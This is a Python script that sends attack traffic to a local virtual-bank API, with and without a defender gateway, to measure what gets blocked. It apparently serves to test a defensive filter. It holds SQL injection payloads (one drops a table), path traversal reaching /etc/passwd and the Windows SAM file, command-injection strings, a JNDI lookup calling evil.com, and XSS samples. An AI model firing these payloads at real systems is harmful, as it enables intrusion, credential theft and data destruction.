#!/usr/bin/env python3
"""
Simple Attack Script - Tests with Defender ON/OFF
"""
import asyncio
import aiohttp
import json
import sys
import argparse

# Fix Windows console encoding
if sys.platform == 'win32':
    try:
        sys.stdout.reconfigure(encoding='utf-8')
    except:
        pass

# Configuration
BANK_DIRECT_URL = "http://localhost:8000"  # Direct to bank (defender OFF)
BANK_THROUGH_DEFENDER = "http://localhost:8086"  # Through gateway (defender ON)

# Admin credentials for authentication
ADMIN_EMAIL = "admin@virtualbank.com"
ADMIN_PASSWORD = "AdminPass123!"

# Attack payloads
SQLI_PAYLOADS = [
    "1' OR '1'='1",
    "1' UNION SELECT NULL, username, password FROM users--",
    "admin' OR '1'='1'--",
    "1'; DROP TABLE users--",
]

PATH_TRAVERSAL = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//etc/passwd",
]

RCE_PAYLOADS = [
    "; cat /etc/passwd",
    "| whoami",
    "&& ls -la",
    "${jndi:ldap://evil.com/a}",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert('XSS')",
]

# Legitimate requests that should pass through the gateway
# Based on actual Virtual Bank API endpoints
LEGITIMATE_REQUESTS = [
    {"path": "/health", "method": "GET", "payload": None, "description": "Health check endpoint"},
    {"path": "/auth/register", "method": "POST", "payload": '{"email": "user@example.com", "password": "SecurePass123", "role": "customer"}', "description": "User registration"},
    {"path": "/auth/login", "method": "POST", "payload": '{"email": "customer@bank.com", "password": "MyPassword123"}', "description": "User login"},
    {"path": "/auth/refresh", "method": "POST", "payload": '{"refresh_token": "valid_refresh_token_here"}', "description": "Refresh access token"},
    {"path": "/accounts", "method": "GET", "payload": None, "description": "List accounts (requires auth)"},
    {"path": "/accounts/acc-12345", "method": "GET", "payload": None, "description": "Get specific account"},
    {"path": "/accounts", "method": "POST", "payload": '{"user_id": "user-123", "type": "checking", "initial_balance": "1000.00"}', "description": "Create new account"},
    {"path": "/transactions", "method": "GET", "payload": None, "query": "account_id=acc-12345&transaction_type=all", "description": "Get transaction history"},
    {"path": "/transactions", "method": "GET", "payload": None, "query": "account_id=acc-12345&start_date=2024-01-01&end_date=2024-12-31", "description": "Get filtered transactions"},
    {"path": "/accounts/acc-12345/transfer", "method": "POST", "payload": '{"to_account_id": "acc-67890", "amount": 100.00, "currency": "USD", "note": "Payment"}', "description": "Transfer funds"},
]


async def login_and_get_token(session, base_url):
    """Login and retrieve access token for authenticated requests."""
    login_url = f"{base_url}/auth/login"
    login_data = {
        "email": ADMIN_EMAIL,
        "password": ADMIN_PASSWORD
    }
    
    try:
        async with session.post(login_url, json=login_data, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            if resp.status == 200:
                data = await resp.json()
                token = data.get("access_token")
                if token:
                    print(f"✅ Successfully logged in as {ADMIN_EMAIL}")
                    print(f"   Access token: {token[:50]}...")
                    return token
                else:
                    print(f"⚠️  Login successful but no access_token in response")
                    return None
            else:
                body = await resp.text()
                print(f"❌ Login failed with status {resp.status}: {body[:200]}")
                return None
    except Exception as e:
        print(f"❌ Login error: {e}")
        return None


async def attack_endpoint(session, base_url, path, method="GET", payload=None, query=None, is_legitimate=False, auth_token=None):
    """Send attack request and return result."""
    try:
        url = f"{base_url}{path}"
        
        # Handle query parameters
        if query:
            url = f"{url}?{query}" if "?" not in path else f"{url}&{query}"
        elif method == "GET" and payload:
            url = f"{url}?id={payload}" if "?" not in path else f"{url}&id={payload}"
        
        # Use realistic headers for legitimate requests, attack headers for malicious ones
        if is_legitimate:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "X-Forwarded-For": "192.168.1.50",
                "X-Response-Time": "120ms",  # Normal response time for ML detector
                "Accept": "application/json",
            }
        else:
            headers = {
                "User-Agent": "Mozilla/5.0 (Attack-Simulator)",
                "X-Forwarded-For": "192.168.1.100",
            }
        
        # Add authentication token if provided
        if auth_token:
            headers["Authorization"] = f"Bearer {auth_token}"
        
        if method == "POST" and payload:
            try:
                json_data = json.loads(payload)
            except:
                json_data = {"data": payload, "payload": payload}
            
            async with session.post(url, json=json_data, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                status = resp.status
                try:
                    body = await resp.json()
                except:
                    body = await resp.text()
                return {"status": status, "blocked": status == 403 or status == 429, "allowed": status < 400, "response": str(body)[:100]}
        else:
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                status = resp.status
                try:
                    body = await resp.json()
                except:
                    body = await resp.text()
                return {"status": status, "blocked": status == 403 or status == 429, "allowed": status < 400, "response": str(body)[:100]}
    except asyncio.TimeoutError:
        return {"status": "timeout", "blocked": False, "allowed": False, "response": "Request timeout"}
    except aiohttp.ClientConnectorError as e:
        return {"status": "connection_error", "blocked": False, "allowed": False, "response": f"Connection error: {str(e)[:80]}"}
    except Exception as e:
        return {"status": "error", "blocked": False, "allowed": False, "response": str(e)[:100]}


async def run_attack_suite(target_url, defender_mode, show_details=True):
    """Run full attack suite."""
    print("\n" + "=" * 80)
    print(f"🔴 ATTACK SIMULATOR - {defender_mode}")
    print("=" * 80)
    print(f"Target: {target_url}")
    print("=" * 80 + "\n")
    
    stats = {"total": 0, "allowed": 0, "blocked": 0, "errors": 0}
    
    async with aiohttp.ClientSession() as session:
        # Login first to get authentication token
        print("🔐 Authenticating...")
        print("-" * 80)
        auth_token = await login_and_get_token(session, target_url)
        if not auth_token:
            print("⚠️  Warning: Failed to obtain authentication token. Some requests may fail.")
        print()
        
        # Helper function to determine if endpoint needs auth
        def needs_auth(path):
            """Check if endpoint requires authentication (all except /health and /auth/*)"""
            return not (path.startswith("/health") or path.startswith("/auth/"))
        
        # 0. Legitimate Requests (should pass through)
        print("✅ Legitimate Requests (Should Pass Through):")
        print("-" * 80)
        for req in LEGITIMATE_REQUESTS:
            stats["total"] += 1
            query_param = req.get("query", None)
            token = auth_token if needs_auth(req["path"]) else None
            result = await attack_endpoint(session, target_url, req["path"], req["method"], req["payload"], query=query_param, is_legitimate=True, auth_token=token)
            if isinstance(result.get("status"), str) and "error" in result.get("status", "").lower():
                stats["errors"] += 1
                status_icon = "❌ ERROR"
            elif result["blocked"]:
                stats["blocked"] += 1
                status_icon = "🛑 BLOCKED (Unexpected!)"
            elif result["allowed"]:
                stats["allowed"] += 1
                status_icon = "✅ ALLOWED"
            else:
                stats["allowed"] += 1
                status_icon = f"⚠️  {result.get('status', 'UNKNOWN')}"
            
            if show_details:
                desc = req["description"][:40]
                print(f"  {status_icon} | {req['path'][:55]:<55} | {desc} | Status: {result['status']}")
            await asyncio.sleep(0.2)
        
        # 1. SQL Injection Attacks
        print("📌 SQL Injection Attacks:")
        print("-" * 80)
        for payload in SQLI_PAYLOADS:
            stats["total"] += 1
            # Target actual API endpoints with SQL injection
            result = await attack_endpoint(session, target_url, f"/accounts/{payload}", "GET", None, auth_token=auth_token)
            if isinstance(result.get("status"), str) and "error" in result.get("status", "").lower():
                stats["errors"] += 1
                status_icon = "❌ ERROR"
            elif result["blocked"]:
                stats["blocked"] += 1
                status_icon = "🛑 BLOCKED"
            elif result["allowed"]:
                stats["allowed"] += 1
                status_icon = "✅ ALLOWED"
            else:
                stats["allowed"] += 1
                status_icon = f"⚠️  {result.get('status', 'UNKNOWN')}"
            
            if show_details:
                print(f"  {status_icon} | /accounts/{payload[:50]:<50} | Status: {result['status']}")
            await asyncio.sleep(0.2)
        
        # 1b. SQL Injection in Transactions Query Parameters
        print("\n📌 SQL Injection in Transactions Query:")
        print("-" * 80)
        for payload in SQLI_PAYLOADS[:2]:
            stats["total"] += 1
            result = await attack_endpoint(session, target_url, "/transactions", "GET", None, query=f"account_id={payload}", auth_token=auth_token)
            if isinstance(result.get("status"), str) and "error" in result.get("status", "").lower():
                stats["errors"] += 1
                status_icon = "❌ ERROR"
            elif result["blocked"]:
                stats["blocked"] += 1
                status_icon = "🛑 BLOCKED"
            elif result["allowed"]:
                stats["allowed"] += 1
                status_icon = "✅ ALLOWED"
            else:
                stats["allowed"] += 1
                status_icon = f"⚠️  {result.get('status', 'UNKNOWN')}"
            
            if show_details:
                print(f"  {status_icon} | /transactions?account_id={payload[:45]:<45} | Status: {result['status']}")
            await asyncio.sleep(0.2)
        
        # 2. SQL Injection in POST Body
        print("\n📌 SQL Injection in POST Body:")
        print("-" * 80)
        for payload in SQLI_PAYLOADS[:3]:
            stats["total"] += 1
            result = await attack_endpoint(session, target_url, "/auth/login", "POST", payload)
            if isinstance(result.get("status"), str) and "error" in result.get("status", "").lower():
                stats["errors"] += 1
                status_icon = "❌ ERROR"
            elif result["blocked"]:
                stats["blocked"] += 1
                status_icon = "🛑 BLOCKED"
            elif result["allowed"]:
                stats["allowed"] += 1
                status_icon = "✅ ALLOWED"
            else:
                stats["allowed"] += 1
                status_icon = f"⚠️  {result.get('status', 'UNKNOWN')}"
            
            if show_details:
                print(f"  {status_icon} | /auth/login (body: {payload[:45]:<45}) | Status: {result['status']}")
            await asyncio.sleep(0.2)
        
        # 3. Path Traversal
        print("\n📌 Path Traversal Attacks:")
        print("-" * 80)
        for payload in PATH_TRAVERSAL:
            stats["total"] += 1
            result = await attack_endpoint(session, target_url, f"/accounts/{payload}", "GET", None, auth_token=auth_token)
            if isinstance(result.get("status"), str) and "error" in result.get("status", "").lower():
                stats["errors"] += 1
                status_icon = "❌ ERROR"
            elif result["blocked"]:
                stats["blocked"] += 1
                status_icon = "🛑 BLOCKED"
            elif result["allowed"]:
                stats["allowed"] += 1
                status_icon = "✅ ALLOWED"
            else:
                stats["allowed"] += 1
                status_icon = f"⚠️  {result.get('status', 'UNKNOWN')}"
            
            if show_details:
                print(f"  {status_icon} | /accounts/{payload[:55]:<55} | Status: {result['status']}")
            await asyncio.sleep(0.2)
        
        # 4. RCE Attacks (targeting admin endpoints)
        print("\n📌 RCE Attacks (Admin Endpoints):")
        print("-" * 80)
        for payload in RCE_PAYLOADS:
            stats["total"] += 1
            # Try RCE in admin audit logs query
            result = await attack_endpoint(session, target_url, "/admin/audit-logs", "GET", None, query=f"user_id={payload}", auth_token=auth_token)
            if isinstance(result.get("status"), str) and "error" in result.get("status", "").lower():
                stats["errors"] += 1
                status_icon = "❌ ERROR"
            elif result["blocked"]:
                stats["blocked"] += 1
                status_icon = "🛑 BLOCKED"
            elif result["allowed"]:
                stats["allowed"] += 1
                status_icon = "✅ ALLOWED"
            else:
                stats["allowed"] += 1
                status_icon = f"⚠️  {result.get('status', 'UNKNOWN')}"
            
            if show_details:
                print(f"  {status_icon} | /admin/audit-logs?user_id={payload[:45]:<45} | Status: {result['status']}")
            await asyncio.sleep(0.2)
        
        # 5. XSS Attacks (in transaction queries)
        print("\n📌 XSS Attacks (Transaction Queries):")
        print("-" * 80)
        for payload in XSS_PAYLOADS:
            stats["total"] += 1
            # Try XSS in transaction note or query parameters
            result = await attack_endpoint(session, target_url, "/transactions", "GET", None, query=f"account_id=acc-123&note={payload}", auth_token=auth_token)
            if isinstance(result.get("status"), str) and "error" in result.get("status", "").lower():
                stats["errors"] += 1
                status_icon = "❌ ERROR"
            elif result["blocked"]:
                stats["blocked"] += 1
                status_icon = "🛑 BLOCKED"
            elif result["allowed"]:
                stats["allowed"] += 1
                status_icon = "✅ ALLOWED"
            else:
                stats["allowed"] += 1
                status_icon = f"⚠️  {result.get('status', 'UNKNOWN')}"
            
            if show_details:
                print(f"  {status_icon} | /transactions?note={payload[:45]:<45} | Status: {result['status']}")
            await asyncio.sleep(0.2)
    
    # Summary
    print("\n" + "=" * 80)
    print("📊 ATTACK SUMMARY")
    print("=" * 80)
    print(f"Total Attacks: {stats['total']}")
    print(f"  ✅ Allowed: {stats['allowed']} ({100 * stats['allowed'] / max(stats['total'], 1):.1f}%)")
    print(f"  🛑 Blocked: {stats['blocked']} ({100 * stats['blocked'] / max(stats['total'], 1):.1f}%)")
    print(f"  ❌ Errors: {stats['errors']} ({100 * stats['errors'] / max(stats['total'], 1):.1f}%)")
    print("=" * 80 + "\n")
    
    return stats


async def main():
    parser = argparse.ArgumentParser(description="Attack Simulator")
    parser.add_argument("--defender", choices=["on", "off"], default="off", help="Defender mode: 'on' = through gateway (localhost:8085), 'off' = direct (localhost:8000)")
    parser.add_argument("--quiet", action="store_true", help="Show only summary")
    
    args = parser.parse_args()
    
    if args.defender == "on":
        target_url = BANK_THROUGH_DEFENDER
        mode = "DEFENDER ON (via Gateway)"
    else:
        target_url = BANK_DIRECT_URL
        mode = "DEFENDER OFF (Direct to Bank)"
    
    await run_attack_suite(target_url, mode, show_details=not args.quiet)


if __name__ == "__main__":
    asyncio.run(main())

